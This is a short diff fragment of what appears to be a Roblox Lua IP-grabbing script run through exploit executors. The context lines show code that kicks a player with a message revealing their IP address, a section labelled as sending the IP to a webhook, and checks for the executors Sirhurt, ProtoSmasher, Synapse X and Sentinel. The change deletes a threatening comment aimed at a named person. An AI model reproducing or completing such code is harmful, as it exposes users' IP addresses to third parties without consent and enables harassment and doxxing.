@@ -7,7 +7,6 @@ local plr = game.Players.LocalPlayer
 plr:Kick('Hello, '..plr.Name..' Your ip is '..ip)]]
 
 ---- Send ip to webhook (Thank you !Zy)
--- koushal better watch out bro
 local webhookcheck =
    is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
    secure_load and "Sentinel" or
